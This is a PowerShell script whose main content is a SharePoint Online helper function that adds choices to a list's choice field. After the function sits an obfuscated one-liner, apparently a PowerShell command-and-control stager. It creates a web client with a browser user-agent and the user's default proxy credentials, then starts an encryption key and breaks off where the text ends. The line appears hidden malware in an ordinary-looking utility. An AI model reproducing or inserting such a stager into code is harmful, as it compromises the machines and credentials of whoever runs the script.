

function Add-SPOChoicesToField
{
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory=$true, Position=1)]
		[string[]] $choices, 
		
		[Parameter(Mandatory=$true, Position=2)]
		[string] $fieldName, 
		
		[Parameter(Mandatory=$true, Position=3)]
		[string] $listTitle
	)

	Write-Host "Adding choices to field $fieldName" -foregroundcolor black -backgroundcolor yellow
    $web = $clientContext.Web
    $list = $web.Lists.GetByTitle($listTitle)
    $fields = $list.Fields
    $clientContext.Load($fields)
    $clientContext.ExecuteQuery()

    if (Test-SPOField $list $fields $fieldName)
    {
        $field = $fields.GetByInternalNameOrTitle($fieldName)
        $clientContext.Load($field)
        $clientContext.ExecuteQuery()
        
        
        $method = [Microsoft.Sharepoint.Client.ClientContext].GetMethod("CastTo")
        $castToMethod = $method.MakeGenericMethod([Microsoft.Sharepoint.Client.FieldChoice])
        $fieldChoice = $castToMethod.Invoke($clientContext, $field)
        
        $currentChoices = $fieldChoice.Choices
        
        
        $allChoices = $currentChoices + $choices
        
        
        $fieldChoice.Choices = $allChoices
        $fieldChoice.Update()
        
        $list.Update()
        $clientContext.ExecuteQuery()
		Write-Host "Choices added to field $fieldName" -foregroundcolor black -backgroundcolor yellow
    }
    else
    {
		Write-Host "Field $fieldName doesn't exists in list $listTitle" -foregroundcolor black -backgroundcolor red
    }
}

$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

